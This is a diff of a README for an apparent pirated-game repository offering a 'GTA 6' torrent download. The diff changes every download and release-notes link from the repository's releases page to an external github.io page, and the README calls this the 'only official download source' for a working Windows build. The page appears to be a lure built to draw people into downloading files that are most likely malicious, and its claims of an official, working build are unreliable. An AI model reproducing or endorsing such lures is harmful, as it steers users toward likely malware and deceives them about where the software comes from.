@@ -1,6 +1,6 @@
 # 🎮 GTA 6 Torrent Download Magnet Link 2026 - Download Now, Play Instantly!
 
-[![DOWNLOAD](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Iaraje8820/GTA-6-Torrent-Download-Magnet-Link-2026/releases)
+[![DOWNLOAD](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-00FF00?style=for-the-badge&logo=github&logoColor=white)](https://iaraje8820.github.io)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Visit this link to download the application:
 
-### [👉 CLICK HERE TO DOWNLOAD GTA 6 👈](https://github.com/Iaraje8820/GTA-6-Torrent-Download-Magnet-Link-2026/releases)
+### [👉 CLICK HERE TO DOWNLOAD GTA 6 👈](https://iaraje8820.github.io)
 
 This is the only official download source for this repository. The download page contains the latest working build of GTA 6 for Windows PC.
 
@@ -132,8 +132,8 @@ A: Yes, the multiplayer beta is included and functional.
 
 | Action | Link |
 |--------|------|
-| **Download GTA 6** | [Click Here](https://github.com/Iaraje8820/GTA-6-Torrent-Download-Magnet-Link-2026/releases) |
-| **Release Notes** | [View Latest Version](https://github.com/Iaraje8820/GTA-6-Torrent-Download-Magnet-Link-2026/releases) |
+| **Download GTA 6** | [Click Here](https://iaraje8820.github.io) |
+| **Release Notes** | [View Latest Version](https://iaraje8820.github.io) |
 
 ---
 
